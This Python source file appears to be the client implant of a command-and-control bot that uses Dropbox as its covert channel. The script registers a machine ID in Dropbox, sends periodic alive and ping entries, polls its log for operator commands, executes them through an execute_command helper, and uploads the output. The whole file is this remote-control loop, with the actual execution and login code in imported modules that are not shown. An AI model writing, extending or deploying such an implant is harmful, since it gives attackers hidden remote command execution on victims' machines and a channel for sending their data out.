import time
import client.exec as cexec
import client.payloads as cpayload
import client.id as cid
import ccchanel.file as ccfile
import ccchanel.log as cclog
import ccchanel.dropbox_api as cc_api

def amIRegistered(dbx, id):
    file_list_dict = ccfile.list_files(dbx, '')
    file_list = file_list_dict.keys()
    return id in file_list
def registerSelf(dbx, id):
    cclog.log_init(dbx, '/' + id)

def tellAlive(dbx, id):
    cclog.log_append(dbx, '/' + id, cpayload.alive_create())

def getCommand(dbx, id):
    log = cclog.log_read(dbx, '/' + id)
    for log_entry in reversed(log):
        if log_entry.get('command', False):
            return log_entry.get('command')
    return None

if __name__ == "__main__":
    sleep_time = 15
    dbx = cc_api.dropbox_login()
    ls = ccfile.list_files(dbx, '')
    id = cid.id()
    if not amIRegistered(dbx, id):
        registerSelf(dbx, id)
    tellAlive(dbx, id)
    while True:
        cmd = getCommand(dbx, id)
        if cmd is not None:
            cmd = cmd['command']
            cmd_id = cmd['timestamp']
            exec_out = cexec.execute_command(cmd['kind'], cmd['args'])
            cclog.log_append(dbx, '/' + id, cpayload.done_create(cmd_id, exec_out))
        time.sleep(sleep_time)
        cclog.log_append(dbx, '/' + id, cpayload.ping_create())
